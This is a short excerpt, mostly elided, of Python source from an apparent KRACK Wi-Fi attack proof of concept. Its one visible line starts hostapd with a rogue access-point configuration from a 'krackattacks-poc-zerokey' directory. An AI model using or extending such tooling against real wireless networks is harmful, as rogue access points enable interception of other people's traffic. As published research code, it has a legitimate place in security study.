...
class KRAckAttack():
	...
	def run(self, strict_echo_test=False):
		...
		self.hostapd = subprocess.Popen(["hostapd", "/root/krackattacks-poc-zerokey/hostapd/hostapd_rogue.conf", "-d"],executable="hostapd", stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
